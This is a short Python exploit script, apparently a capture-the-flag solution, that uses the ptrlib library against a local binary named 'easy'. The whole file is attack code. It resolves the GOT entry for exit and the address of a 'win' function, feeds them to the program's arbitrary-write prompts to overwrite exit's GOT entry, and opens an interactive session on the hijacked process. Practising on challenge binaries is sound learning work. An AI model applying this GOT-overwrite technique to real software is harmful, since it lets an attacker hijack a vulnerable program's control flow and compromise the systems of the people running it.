from ptrlib import *

binpath = "./easy"

def main():
    proc = Process(binpath)
    elf = ELF(binpath)

    exit_got = elf.got("exit")
    win_addr = elf.symbol("win")

    # exit_got 4210720
    # win_addr 4198758
    print("exit_got", exit_got)
    print("win_addr", win_addr)

    # hex(exit_got) 0x404020
    # hex(win_addr) 0x401166
    print("exit_got", hex(exit_got))
    print("win_addr", hex(win_addr))

    # need hex for hexing data
    proc.sendlineafter("Input address to write >> ", hex(exit_got))
    proc.sendlineafter("Input value >> ", hex(win_addr))
    proc.interactive()

if __name__ == "__main__":
    main()
